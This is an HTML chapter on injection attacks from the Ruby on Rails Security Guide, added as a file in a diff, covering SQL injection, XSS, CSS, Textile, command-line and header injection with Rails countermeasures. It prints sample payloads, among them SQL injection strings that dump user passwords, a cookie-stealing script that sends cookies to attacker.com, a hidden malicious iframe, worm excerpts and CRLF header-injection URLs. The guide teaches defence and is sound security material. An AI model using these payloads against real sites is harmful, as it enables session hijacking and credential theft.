@@ -1,0 +1,447 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>7 Injection</title>
+<link rel="stylesheet" type="text/css" href="/home/rails/v5.2.8.1/guides/output/kindle/stylesheets/kindle.css">
+</head>
+<body>
+<h3 id="injection"><a class="anchorlink" href="#injection">7 Injection</a></h3>
+<div class="info"><p><em>Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection.</em></p></div>
+
+<p>Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.</p>
+
+<h4 id="whitelists-versus-blacklists"><a class="anchorlink" href="#whitelists-versus-blacklists">7.1 Whitelists versus Blacklists</a></h4>
+
+<div class="note"><p><em>When sanitizing, protecting or verifying something, prefer whitelists over blacklists.</em></p></div>
+
+<p>A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), <em>prefer to use whitelist approaches</em>:</p>
+<ul>
+<li>Use before_action except: [...] instead of only: [...] for security-related actions. This way you don't forget to enable security checks for newly added actions.</li>
+<li>Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.</li>
+<li>Don't try to correct user input by blacklists:
+
+<ul>
+<li>This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")</li>
+<li>But reject malformed input</li>
+</ul>
+</li>
+</ul>
+<p>Whitelists are also a good approach against the human factor of forgetting something in the blacklist.</p>
+
+<h4 id="sql-injection"><a class="anchorlink" href="#sql-injection">7.2 SQL Injection</a></h4>
+
+<div class="info"><p><em>Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.</em></p></div>
+
+<h5 id="sql-injection-introduction"><a class="anchorlink" href="#sql-injection-introduction">7.2.1 Introduction</a></h5>
+
+<p>SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+Project.where("name = '#{params[:name]}'")
+
+</pre>
+</div>
+<p>This could be in a search action and the user may enter a project's name that they want to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:</p>
+
+<div class="code_container">
+<pre class="brush: sql; gutter: false; toolbar: false">
+SELECT * FROM projects WHERE name = '' OR 1 --'
+
+</pre>
+</div>
+<p>The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.</p>
+
+<h5 id="bypassing-authorization"><a class="anchorlink" href="#bypassing-authorization">7.2.2 Bypassing Authorization</a></h5>
+
+<p>Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
+
+</pre>
+</div>
+<p>If an attacker enters ' OR '1'='1 as the name, and ' OR '2'&gt;'1 as the password, the resulting SQL query will be:</p>
+
+<div class="code_container">
+<pre class="brush: sql; gutter: false; toolbar: false">
+SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
+
+</pre>
+</div>
+<p>This will simply find the first record in the database, and grants access to this user.</p>
+
+<h5 id="unauthorized-reading"><a class="anchorlink" href="#unauthorized-reading">7.2.3 Unauthorized Reading</a></h5>
+
+<p>The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+Project.where("name = '#{params[:name]}'")
+
+</pre>
+</div>
+<p>And now let's inject another query using the UNION statement:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
+
+</pre>
+</div>
+<p>This will result in the following SQL query:</p>
+
+<div class="code_container">
+<pre class="brush: sql; gutter: false; toolbar: false">
+SELECT * FROM projects WHERE (name = '') UNION
+  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
+
+</pre>
+</div>
+<p>The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.</p>
+
+<p>Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">to at least 2.1.1</a>.</p>
+
+<h5 id="sql-injection-countermeasures"><a class="anchorlink" href="#sql-injection-countermeasures">7.2.4 Countermeasures</a></h5>
+
+<p>Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <em>Using <code>Model.find(id)</code> or <code>Model.find_by_some thing(something)</code> automatically applies this countermeasure</em>. But in SQL fragments, especially <em>in conditions fragments (<code>where("...")</code>), the <code>connection.execute()</code> or <code>Model.find_by_sql()</code> methods, it has to be applied manually</em>.</p>
+
+<p>Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
+
+</pre>
+</div>
+<p>As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+Model.where(login: entered_user_name, password: entered_password).first
+
+</pre>
+</div>
+<p>The array or hash form is only available in model instances. You can try <code>sanitize_sql()</code> elsewhere. <em>Make it a habit to think about the security consequences when using an external string in SQL</em>.</p>
+
+<h4 id="cross-site-scripting-xss"><a class="anchorlink" href="#cross-site-scripting-xss">7.3 Cross-Site Scripting (XSS)</a></h4>
+
+<div class="info"><p><em>The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.</em></p></div>
+
+<h5 id="entry-points"><a class="anchorlink" href="#entry-points">7.3.1 Entry Points</a></h5>
+
+<p>An entry point is a vulnerable URL and its parameters where an attacker can start an attack.</p>
+
+<p>The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.</p>
+
+<p>XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.</p>
+
+<p>During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security threat report</a> also documented 239 browser plug-in vulnerabilities in the last six months of 2007. <a href="http://pandalabs.pandasecurity.com/mpack-uncovered/">Mpack</a> is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high profile targets.</p>
+
+<h5 id="html-javascript-injection"><a class="anchorlink" href="#html-javascript-injection">7.3.2 HTML/JavaScript Injection</a></h5>
+
+<p>The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. <em>Escaping user input is essential</em>.</p>
+
+<p>Here is the most straightforward test to check for XSS:</p>
+
+<div class="code_container">
+<pre class="brush: xml; gutter: false; toolbar: false">
+&lt;script&gt;alert('Hello');&lt;/script&gt;
+
+</pre>
+</div>
+<p>This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:</p>
+
+<div class="code_container">
+<pre class="brush: xml; gutter: false; toolbar: false">
+&lt;img src=javascript:alert('Hello')&gt;
+&lt;table background="javascript:alert('Hello')"&gt;
+
+</pre>
+</div>
+<h6 id="cookie-theft"><a class="anchorlink" href="#cookie-theft">7.3.2.1 Cookie Theft</a></h6>
+
+<p>These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
+
+</pre>
+</div>
+<p>For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL <a href="http://www.attacker.com/">http://www.attacker.com/</a> plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server's access log files to see the victim's cookie.</p>
+
+<div class="code_container">
+<pre class="brush: xml; gutter: false; toolbar: false">
+&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' + document.cookie + '"&gt;');&lt;/script&gt;
+
+</pre>
+</div>
+<p>The log files on <a href="http://www.attacker.com">www.attacker.com</a> will read like this:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+
+</pre>
+</div>
+<p>You can mitigate these attacks (in the obvious way) by adding the <strong>httpOnly</strong> flag to cookies, so that document.cookie may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies <a href="https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HttpOnly">will still be visible using Ajax</a>, though.</p>
+
+<h6 id="defacement"><a class="anchorlink" href="#defacement">7.3.2.2 Defacement</a></h6>
+
+<p>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:</p>
+
+<div class="code_container">
+<pre class="brush: xml; gutter: false; toolbar: false">
+&lt;iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"&gt;&lt;/iframe&gt;
+
+</pre>
+</div>
+<p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the <a href="http://isc.sans.org/diary.html?storyid=3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.</p>
+
+<p>A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.</p>
+
+<p>Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
+  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
+
+</pre>
+</div>
+<h6 id="html-javascript-injection-countermeasures"><a class="anchorlink" href="#html-javascript-injection-countermeasures">7.3.2.3 Countermeasures</a></h6>
+
+<p><em>It is very important to filter malicious input, but it is also important to escape the output of the web application</em>.</p>
+
+<p>Especially for XSS, it is important to do <em>whitelist input filtering instead of blacklist</em>. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.</p>
+
+<p>Imagine a blacklist deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+strip_tags("some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;")
+
+</pre>
+</div>
+<p>This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why a whitelist approach is better, using the updated Rails 2 method sanitize():</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+s = sanitize(user_input, tags: tags, attributes: %w(href title))
+
+</pre>
+</div>
+<p>This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.</p>
+
+<p>As a second step, <em>it is good practice to escape all output of the application</em>, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). <em>Use <code>escapeHTML()</code> (or its alias <code>h()</code>) method</em> to replace the HTML input characters &amp;, ", &lt;, and &gt; by their uninterpreted representations in HTML (<code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;lt;</code>, and <code>&amp;gt;</code>).</p>
+
+<h6 id="obfuscation-and-encoding-injection"><a class="anchorlink" href="#obfuscation-and-encoding-injection">7.3.2.4 Obfuscation and Encoding Injection</a></h6>
+
+<p>Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
+  &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+
+</pre>
+</div>
+<p>This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the <a href="https://hackvertor.co.uk/public">Hackvertor</a>. Rails' sanitize() method does a good job to fend off encoding attacks.</p>
+
+<h5 id="examples-from-the-underground"><a class="anchorlink" href="#examples-from-the-underground">7.3.3 Examples from the Underground</a></h5>
+
+<p><em>In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors.</em></p>
+
+<p>The following is an excerpt from the <a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! Mail <a href="http://groovin.net/stuff/yammer.txt">worm</a>. It appeared on June 11, 2006 and was the first webmail interface worm:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
+  target=""onload="var http_request = false;    var Email = '';
+  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
+
+</pre>
+</div>
+<p>The worms exploit a hole in Yahoo's HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.</p>
+
+<p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on <a href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">Rosario Valotta's paper</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p>
+
+<p>In December 2006, 34,000 actual user names and passwords were stolen in a <a href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.</p>
+
+<h4 id="css-injection"><a class="anchorlink" href="#css-injection">7.4 CSS Injection</a></h4>
+
+<div class="info"><p><em>CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.</em></p></div>
+
+<p>CSS Injection is explained best by the well-known <a href="https://samy.pl/popular/tech.html">MySpace Samy worm</a>. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.</p>
+
+<p>MySpace blocked many tags, but allowed CSS. So the worm's author put JavaScript into CSS like this:</p>
+
+<div class="code_container">
+<pre class="brush: xml; gutter: false; toolbar: false">
+&lt;div style="background:url('javascript:alert(1)')"&gt;
+
+</pre>
+</div>
+<p>So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.</p>
+
+<div class="code_container">
+<pre class="brush: xml; gutter: false; toolbar: false">
+&lt;div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"&gt;
+
+</pre>
+</div>
+<p>The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word "innerHTML":</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+alert(eval('document.body.inne' + 'rHTML'));
+
+</pre>
+</div>
+<p>The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:</p>
+
+<div class="code_container">
+<pre class="brush: xml; gutter: false; toolbar: false">
+&lt;div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')"&gt;
+
+</pre>
+</div>
+<p>Another problem for the worm's author was the <a href="#cross-site-request-forgery-csrf">CSRF security tokens</a>. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.</p>
+
+<p>In the end, he got a 4 KB worm, which he injected into his profile page.</p>
+
+<p>The <a href="http://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a> CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).</p>
+
+<h5 id="css-injection-countermeasures"><a class="anchorlink" href="#css-injection-countermeasures">7.4.1 Countermeasures</a></h5>
+
+<p>This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good whitelist CSS filter. <em>If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application</em>. Use Rails' <code>sanitize()</code> method as a model for a whitelist CSS filter, if you really need one.</p>
+
+<h4 id="textile-injection"><a class="anchorlink" href="#textile-injection">7.5 Textile Injection</a></h4>
+
+<p>If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. <a href="http://redcloth.org/">RedCloth</a> is such a language for Ruby, but without precautions, it is also vulnerable to XSS.</p>
+
+<p>For example, RedCloth translates <code>_test_</code> to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the <a href="http://www.redcloth.org">all-new version 4</a> that removed serious bugs. However, even that version has <a href="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">some security bugs</a>, so the countermeasures still apply. Here is an example for version 3.0.4:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;').to_html
+# =&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+</pre>
+</div>
+<p>Use the :filter_html option to remove HTML which was not created by the Textile processor.</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;', [:filter_html]).to_html
+# =&gt; "alert(1)"
+
+</pre>
+</div>
+<p>However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+RedCloth.new("&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;", [:filter_html]).to_html
+# =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"
+
+</pre>
+</div>
+<h5 id="textile-injection-countermeasures"><a class="anchorlink" href="#textile-injection-countermeasures">7.5.1 Countermeasures</a></h5>
+
+<p>It is recommended to <em>use RedCloth in combination with a whitelist input filter</em>, as described in the countermeasures against XSS section.</p>
+
+<h4 id="ajax-injection"><a class="anchorlink" href="#ajax-injection">7.6 Ajax Injection</a></h4>
+
+<div class="note"><p><em>The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view.</em></p></div>
+
+<p>If you use the <a href="https://rubygems.org/gems/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <em>you have to escape the return value in the action</em>. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.</p>
+
+<h4 id="command-line-injection"><a class="anchorlink" href="#command-line-injection">7.7 Command Line Injection</a></h4>
+
+<div class="note"><p><em>Use user-supplied command line parameters with caution.</em></p></div>
+
+<p>If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and <code>command</code>. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).</p>
+
+<p>A countermeasure is to <em>use the <code>system(command, parameters)</code> method which passes command line parameters safely</em>.</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+system("/bin/echo","hello; rm *")
+# prints "hello; rm *" and does not delete files
+
+</pre>
+</div>
+<h4 id="header-injection"><a class="anchorlink" href="#header-injection">7.8 Header Injection</a></h4>
+
+<div class="warning"><p><em>HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting.</em></p></div>
+
+<p>HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. <em>Remember to escape these header fields, too.</em> For example when you display the user agent in an administration area.</p>
+
+<p>Besides that, it is <em>important to know what you are doing when building response headers partly based on user input.</em> For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:</p>
+
+<div class="code_container">
+<pre class="brush: ruby; gutter: false; toolbar: false">
+redirect_to params[:referer]
+
+</pre>
+</div>
+<p>What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
+
+</pre>
+</div>
+<p>And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
+http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
+
+</pre>
+</div>
+<p>Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+HTTP/1.1 302 Moved Temporarily
+(...)
+Location: http://www.malicious.tld
+
+</pre>
+</div>
+<p>So <em>attack vectors for Header Injection are based on the injection of CRLF characters in a header field.</em> And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the <code>redirect_to</code> method. <em>Make sure you do it yourself when you build other header fields with user input.</em></p>
+
+<h5 id="response-splitting"><a class="anchorlink" href="#response-splitting">7.8.1 Response Splitting</a></h5>
+
+<p>If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:</p>
+
+<div class="code_container">
+<pre class="brush: plain; gutter: false; toolbar: false">
+HTTP/1.1 302 Found [First standard 302 response]
+Date: Tue, 12 Apr 2005 22:09:07 GMT
+Location: Content-Type: text/html
+
+
+HTTP/1.1 200 OK [Second New response created by attacker begins]
+Content-Type: text/html
+
+
+&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitrary malicious input is
+Keep-Alive: timeout=15, max=100         shown as the redirected page]
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+</pre>
+</div>
+<p>Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. <em>In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.</em></p>
+</body>
+</html>
